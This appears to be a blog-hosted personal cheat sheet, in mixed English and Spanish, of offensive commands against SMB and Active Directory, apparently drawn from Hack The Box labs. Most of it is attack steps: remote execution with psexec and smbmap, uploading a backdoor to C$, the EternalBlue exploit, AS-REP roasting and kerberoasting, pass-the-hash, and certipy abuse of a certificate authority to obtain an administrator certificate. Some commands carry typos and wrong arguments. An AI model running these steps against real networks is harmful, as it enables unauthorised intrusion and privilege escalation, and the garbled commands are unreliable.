---
title: 'SMB (Server Message Block)'
description: ''
pubDate: 'Jul 03 2022'
tag: ['windows', 'smb']
slug: vuln/smb
---

## Information

- It's a network file sharing protocol that is used to facilitate the sharing of files and peripherals between computers on a local network (LAN).

- Uses port 445(TCP). SMB ran on top of NetBIOS using port 139.

- Samba is an open source Linux implementation of SMB, and alllows Windows systems to access Linux shres and devices

## Exploit

knowing creds.

```bash
psexec.py Administrator@target cmd.exe
```

### Windows Discover and mount

How to mount in powershell:

```bash
# Clear the stored session
net use * /delete

# Mount the target folder
net use Z: \\10.4.17.133\C$ smbserver_771 /user:administrator
```

### SMB Windows Recon: Nmap scripts

```bash
$nmap target
135/tcp   open    msrpc
139/tcp   open    netbios-ssn
445/tcp   open    microsoft-ds

# list the supported protocols and dialects of an SMB server
$nmap -p445 --script smb-protocols target
...

# information about the SMB security level.
$nmap -p445 --script smb-security-mode target
...(but defult usually makes good )
... acc

# with creds discover sensitive information
$nmap -p445 --script smb-enum-sessions target
...

# In case guest login is not enabled we can always use valid credentials of the target machine to discover the same information

$nmap -p445 --script smb-enum-sessions --script-args
...smbusername=administrator,smbpassword=smbserver_771 target

$nmap -p445 --script smb-enum-sessions target --script-args smbusername=administrator,smbpassword=smbserver_771 target
...

$nmap -p445 --script smb-enum-shares target
...

$nmap -p445 --script smb-enum-shares target --script-args
...smbusername=administrator,smbpassword=smbserver_771 target
```

### smbmap Recon

```bash
# NULL SESSION - user, pass, directory, host
smbmap -u guest -p "" -d . -H target

# Remote code execution :D!
smbmap -u administrato -p "" -d . -H target -x 'ipconfig'

smbmap -u administrato -p "" -d . -H target -x 'ipconfig' -L

# connect to C drive
smbmap -u administrato -p "" -d . -H target -x 'ipconfig' -r 'C$'

# upload file
smbmap -u Administrator -p "smbserver_771" -H target -d --upload '/root/payload' 'C$\backdoor'

# download file
smbmap -u Administrator -p "smbserver_771" -H target --download 'C$\flag.txt'

```

### SMBClient - ftp-like client to access SMB/CIFS resources on servers.

Windows 7 y smb puede ser un Eternalblue.

-> AutoBlue-Ms17-010

1: eternal_checker.py target
2: python2.7 zzz_exploit.py target

```bash
$nmblookup -A taget

$rpcclient -U "" -N target

# If we see IPC$ maybe null session works
$smbclient -L target -N

# rid -> 0x200
rpcclient -U "leo&micontraseña" 10.10.11.233 -c "querygroup 0x200"
######################################
# Despues de montar podemos ver en ls -lsa /media/k_share
sudo mount.cifs //target/c /media/k_share user=,pass=

#if discover pass
smbmap -H target -u admin -p password1

# pivot
$smbclient -L target -U jane
or
$smbclient //target/jane -U jane

#other way to find users:
$enum4linux -r -u "admin" -p "password1" target

# users get by enum4linux

GetNPUsers.py user.local/ -dc-ip 10.10.10.161 -request
```

### Kerberos

```bash
# Ningunoi de estos kerberos sirce para cepas de hash
# AS-REP Roasting attack, el usuario que muestre tiene configurado UF_DONT_REQUIRE_PREAUTH
GetNPUsers.py domaindomain_name.local/ -no-pass -usersfile culos_validos.txt

# intentamos crackear el hash con jhon, si conseguimos el pass toca
# kerberoasting attack, SI TENEMOS CREDENCIALES VALIDAS
## request para coger el hash
GetUserSPN.py target.htb/leonardo # muestra si es kerberoasteable
GetUserSPN.py 'domain_name.local/username:password' -request

# no aplica psexec.py si cmp no pwnea el usuario, si no muetra nada smbmap

#desplegar un smbrelay y tratando de interceptar autenticacion a nivel red si el smb no esta firmado se puede tratar de coger la autenticacion de un usuario privs, es un hash a nivel de red no permite hacer cepas de hash o retocar el responder.conf indicadno las target.
# apt install bloodhound neo4j
neo4j console
# bloodhound para enumerar, detectar vias para escalar privs
bloodhound-python.py -c all -u 'culo' -p 'culo' -ns 10.10.10.10 -d domainname.local
bloodhound.py # De github
# pass de hash
cmp winrm doman -u 'culo' -H 'HASH'
# este usuario pertenece al grupo remote management users
evil-winrm -i domain -u 'culo'

```

### Rid brute force

```bash
crackmapexec smb target_ip -u anonymous -p '' --rid-brute 10000
```

### Active Directory (AD)

```bash
certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'culo_torcido' -dc-ip target_ip

certipy ca -ca 'manager-DC01-CA' -username raven@manager.htb -password 'culo_torcido' -dc-ip target_ip -enable-template 'SubCA'

certipy req -username raven@manager.htb -password 'culo_torcido' -ca 'manager-DC01-CA' -target manager.htb -template SubCA -upn administrator@manager.htb

certipy ca -ca 'manager-DC01-CA' -issue-request 20 -username raven@manager.htb -password 'culo_torcido'

certipy req -username raven@manager.htb -password 'culo_torcido' -ca 'manager-DC01-CA' -target target_ip -retrieve 20


certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'manager.htb' -dc-ip target_ip

# sntp -sS manager.htb
# ntpdate target_ip
# rdate -n target_ip
# nos metemos con psexec y el hash repotado

```
